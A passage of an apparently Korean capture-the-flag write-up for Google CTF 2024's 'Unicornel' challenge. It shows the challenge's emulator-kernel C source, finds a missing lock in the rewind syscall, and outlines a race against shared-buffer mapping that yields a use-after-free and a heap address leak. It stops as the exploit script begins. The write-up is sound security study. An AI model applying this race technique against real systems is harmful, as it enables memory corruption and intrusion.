</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> current<span style="color:#f92672">-&gt;</span>num_maps; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_mem_map</span>(new_uc,current<span style="color:#f92672">-&gt;</span>maps[i].va,current<span style="color:#f92672">-&gt;</span>maps[i].length,UC_PROT_ALL);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">!=</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">uc_close</span>(new_uc);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//Transition the memory across to the new uc
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> transition_buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(current<span style="color:#f92672">-&gt;</span>maps[i].length);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>transition_buffer) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">uc_close</span>(new_uc);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uc_mem_read</span>(current<span style="color:#f92672">-&gt;</span>uc,current<span style="color:#f92672">-&gt;</span>maps[i].va,transition_buffer,current<span style="color:#f92672">-&gt;</span>maps[i].length);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uc_mem_write</span>(new_uc,current<span style="color:#f92672">-&gt;</span>maps[i].va,transition_buffer,current<span style="color:#f92672">-&gt;</span>maps[i].length);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">free</span>(transition_buffer);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Including shared regions
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(og_sbr.va)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uc_mem_map_ptr</span>(new_uc,og_sbr.va,og_sbr.length,UC_PROT_ALL,shared_buffers[og_sbr.handle].buffer);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//Transitioning architectures means there&#39;s now two references to the shared buffer - the original arch ref and the new arch ref
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        shared_buffers[og_sbr.handle].refs<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.unmap_on_rewind <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Destroy bookmark, because we can&#39;t rewind through architectures anyway
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">uc_context_free</span>(current<span style="color:#f92672">-&gt;</span>bookmark);
</span></span><span style="display:flex;"><span>    current<span style="color:#f92672">-&gt;</span>bookmark <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Complete transition
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    current<span style="color:#f92672">-&gt;</span>uc <span style="color:#f92672">=</span> new_uc;
</span></span><span style="display:flex;"><span>    current<span style="color:#f92672">-&gt;</span>arch <span style="color:#f92672">=</span> arch;
</span></span><span style="display:flex;"><span>    arch_used[arch] <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    arch_used[og_arch] <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    current<span style="color:#f92672">-&gt;</span>transition <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uc_emu_start</span>(new_uc,new_pc,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Detransition, destorying the new state and restoring the old state so destroy_process can clean up
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    current<span style="color:#f92672">-&gt;</span>uc <span style="color:#f92672">=</span> og_uc;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(current<span style="color:#f92672">-&gt;</span>sbr.va)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//last reference, destroy it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">free</span>(shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].buffer);
</span></span><span style="display:flex;"><span>            shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Restore sbr, only for it to be freed in destroy_process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    current<span style="color:#f92672">-&gt;</span>sbr <span style="color:#f92672">=</span> og_sbr;
</span></span><span style="display:flex;"><span>    arch_used[arch] <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uc_close</span>(new_uc);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uc_emu_stop</span>(og_uc);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>런타임에 아키텍처의 변경을 지원한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">bookmark</span>(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(current<span style="color:#f92672">-&gt;</span>bookmark) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    uc_err e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_context_alloc</span>(current<span style="color:#f92672">-&gt;</span>uc,<span style="color:#f92672">&amp;</span>current<span style="color:#f92672">-&gt;</span>bookmark);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">==</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>        e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_context_save</span>(current<span style="color:#f92672">-&gt;</span>uc,current<span style="color:#f92672">-&gt;</span>bookmark);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> e;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">unicornel_rewind</span>(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(current<span style="color:#f92672">-&gt;</span>bookmark <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    uc_err e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_context_restore</span>(current<span style="color:#f92672">-&gt;</span>uc,current<span style="color:#f92672">-&gt;</span>bookmark);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">!=</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//Couldn&#39;t rewind so just fail out
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* If we bookmarked, then mapped a shared buffer, we need to unmap the shared buffer to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * restore the original state properly.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * We can skip a full unmap_shared call because we do the checking here directly.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(current<span style="color:#f92672">-&gt;</span>sbr.va <span style="color:#f92672">&amp;&amp;</span> current<span style="color:#f92672">-&gt;</span>sbr.unmap_on_rewind)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        uc_err e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_mem_unmap</span>(current<span style="color:#f92672">-&gt;</span>uc,current<span style="color:#f92672">-&gt;</span>sbr.va,current<span style="color:#f92672">-&gt;</span>sbr.length);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">==</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.va <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.unmap_on_rewind <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//last reference, destroy it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">free</span>(shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].buffer);
</span></span><span style="display:flex;"><span>            shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>bookmark &amp; rewind는 현재 context를 저장하고, 이를 다시 복원하는 시스템콜이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> shared_buffer shared_buffers[MAX_PROCESSES] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">create_shared</span>(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARG_REGR</span>(current,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(length <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10000</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>length <span style="color:#f92672">||</span> length <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);            
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Find an empty shared buffer handle
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> handle;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(handle <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; handle <span style="color:#f92672">&lt;</span> MAX_PROCESSES; handle<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>shared_buffers[handle].refs)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(handle <span style="color:#f92672">==</span> MAX_PROCESSES) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">1</span>,length);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>buffer) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    shared_buffers[handle].refs <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">//Set to 1 to give a chance to map it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    shared_buffers[handle].buffer <span style="color:#f92672">=</span> buffer;
</span></span><span style="display:flex;"><span>    shared_buffers[handle].length <span style="color:#f92672">=</span> length;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> handle;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">map_shared</span>(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(current<span style="color:#f92672">-&gt;</span>sbr.va) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARG_REGR</span>(current,<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(handle <span style="color:#f92672">&gt;=</span> MAX_PROCESSES <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>shared_buffers[handle].refs) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARG_REGR</span>(current,<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>length <span style="color:#f92672">||</span> length <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span> <span style="color:#f92672">||</span> length <span style="color:#f92672">&gt;</span> shared_buffers[handle].length) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARG_REGR</span>(current,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>addr<span style="color:#f92672">||</span> addr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    uc_err e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_mem_map_ptr</span>(current<span style="color:#f92672">-&gt;</span>uc,addr, length,UC_PROT_ALL,shared_buffers[handle].buffer);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">==</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        shared_buffers[handle].refs<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.handle <span style="color:#f92672">=</span> handle;
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.length <span style="color:#f92672">=</span> length;
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.va <span style="color:#f92672">=</span> addr;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(current<span style="color:#f92672">-&gt;</span>bookmark)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//We need to unmap the shared mapping on rewind if we bookmarked previously
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            current<span style="color:#f92672">-&gt;</span>sbr.unmap_on_rewind <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> e;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//The bottom reference is only ever released by destroy_shared. Any maps will increase refcount to &gt; 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">unmap_shared</span>(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>current<span style="color:#f92672">-&gt;</span>sbr.va)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    uc_err e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_mem_unmap</span>(current<span style="color:#f92672">-&gt;</span>uc,current<span style="color:#f92672">-&gt;</span>sbr.va,current<span style="color:#f92672">-&gt;</span>sbr.length);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">==</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.va <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.unmap_on_rewind <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//last reference, destroy it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">free</span>(shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].buffer);
</span></span><span style="display:flex;"><span>        shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> e;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>shared memory create &amp; mapping &amp; unmapping을 지원하는 시스템 콜들도 구현되어있다.
나머지는 단순 write 시스템콜이나 아웃풋 출력 관련 시스템콜들이다.</p>
<h3 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">unicornel_rewind</span>(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(current<span style="color:#f92672">-&gt;</span>bookmark <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    uc_err e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_context_restore</span>(current<span style="color:#f92672">-&gt;</span>uc,current<span style="color:#f92672">-&gt;</span>bookmark);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">!=</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//Couldn&#39;t rewind so just fail out
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* If we bookmarked, then mapped a shared buffer, we need to unmap the shared buffer to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * restore the original state properly.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * We can skip a full unmap_shared call because we do the checking here directly.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(current<span style="color:#f92672">-&gt;</span>sbr.va <span style="color:#f92672">&amp;&amp;</span> current<span style="color:#f92672">-&gt;</span>sbr.unmap_on_rewind)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        uc_err e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_mem_unmap</span>(current<span style="color:#f92672">-&gt;</span>uc,current<span style="color:#f92672">-&gt;</span>sbr.va,current<span style="color:#f92672">-&gt;</span>sbr.length);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">==</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.va <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>sbr.unmap_on_rewind <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//last reference, destroy it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">free</span>(shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].buffer);
</span></span><span style="display:flex;"><span>            shared_buffers[current<span style="color:#f92672">-&gt;</span>sbr.handle].refs<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>rewind에서 lock이 구현되지 않아서 map &amp; unmap 등에서 공유 자원 접근에 lock이 걸려있어도 race가 발생하며 특정 케이스에서는 메모리 취약점까지 연계될 수 있다.</p>
<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
<p>race를 악용하기 위해서 생각했던 방식은 rewind syscall과 map을 겹쳐 race를 일으키는 방식이였다.
성공하면 UAF를 얻게 된다.</p>
<pre tabindex="0"><code>pid 0 : save ctx -&gt; pause -&gt; map shared -&gt; resume 1 -&gt; rewind
pid 1 : create shared -&gt; resume 0 -&gt; pause -&gt; map shared
</code></pre><p>실질적으로 저렇게 pause 하고 프로세스 실행시키면 rewind와 map shared를 최대한 겹칠 수 있다.
rewind 이전에 shared memory가 매핑되어야 rewind시에 flag가 세팅되고 unmap이 내부적으로 발생한다.
flag가 세팅되었다고 가정하고 다음과 같은 내부 동작으로 간단하게 표현할 수 있다.</p>
<pre tabindex="0"><code>[MAP]
1) if refs != 0 -&gt; cont
2) refs += 1
3) map_internal()

[REWIND]
1) refs -= 1
2) if refs == 1 -&gt; cont
3) free mem
4) refs -= 1
</code></pre><p>pid 0 : map -&gt; ref count = 2
pid 0 : rewind - (1) -&gt; ref count = 1
pid 0 : rewind - (3) -&gt; memory free
pid 1 : map - (1) -&gt; ref count = 1, condition bypassed
위 순서가 지켜지면 이 이후의 ref count가 어떻게 연산되던간에 변경되더라도 메모리 버그로 연계된다.
<img loading="lazy" src="/blog/Google_CTF_2024_Unicornel/0a7d4599b9270b69796146a1466290af.png" alt=""  />

위 시나리오로 코드를 작성해서 성공적으로 race가 발생하면 해당 쓰레드 힙의 fd가 릭되며 쓰레드 힙 주소를 릭할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># pid 1</span>
